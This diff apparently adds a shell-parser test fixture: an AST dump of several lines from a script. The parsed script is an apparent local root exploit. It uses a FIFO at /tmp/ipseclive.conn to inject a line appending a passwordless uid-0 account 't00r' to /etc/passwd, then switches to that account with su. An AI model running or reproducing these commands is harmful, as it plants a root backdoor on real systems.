@@ -1,0 +1,23 @@
+CommandNode(lineno=26, pos=(1081, 1107), parts=[
+  WordNode(lineno=26, pos=(1081, 1087), word='mkfifo'),
+  WordNode(lineno=26, pos=(1088, 1107), word='/tmp/ipseclive.conn'),
+])
+CommandNode(lineno=27, pos=(1108, 1131), parts=[
+  WordNode(lineno=27, pos=(1108, 1111), word='cat'),
+  WordNode(lineno=27, pos=(1112, 1131), word='/tmp/ipseclive.conn'),
+])
+CommandNode(lineno=28, pos=(1132, 1202), parts=[
+  WordNode(lineno=28, pos=(1132, 1136), word='echo'),
+  WordNode(lineno=28, pos=(1137, 1180), word='echo t00r::0:0::/tmp:/bin/sh>>/etc/passwd'),
+  RedirectNode(lineno=28, output=
+    WordNode(lineno=28, pos=(1183, 1202), word='/tmp/ipseclive.conn'), pos=(1181, 1202), type='>'),
+])
+CommandNode(lineno=29, pos=(1203, 1225), parts=[
+  WordNode(lineno=29, pos=(1203, 1205), word='rm'),
+  WordNode(lineno=29, pos=(1206, 1225), word='/tmp/ipseclive.conn'),
+])
+CommandNode(lineno=30, pos=(1226, 1236), parts=[
+  WordNode(lineno=30, pos=(1226, 1228), word='su'),
+  WordNode(lineno=30, pos=(1229, 1231), word='-l'),
+  WordNode(lineno=30, pos=(1232, 1236), word='t00r'),
+])
